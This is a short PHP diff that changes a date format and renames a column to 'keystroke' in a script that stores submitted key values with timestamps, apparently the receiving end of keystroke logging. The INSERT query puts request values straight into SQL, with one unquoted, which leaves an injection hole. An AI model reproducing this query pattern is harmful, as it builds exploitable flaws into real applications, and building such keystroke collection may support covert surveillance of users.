@@ -1,6 +1,6 @@
 <?php
 	// Current date and time.
-	$curdate = date('m/d/Y');
+	$curdate = date('m-d-Y');
 	$curtime = date('H:i:s');
 	
 	// Get values.
@@ -21,7 +21,7 @@
 			}
 
 			// Insert values into table.
-			$sql = "INSERT INTO data (date, time, keys)
+			$sql = "INSERT INTO data (date, time, keystroke)
 			VALUES ('$curdate', '$curtime', $key)";
 
 			if (mysqli_query($conn, $sql)) {
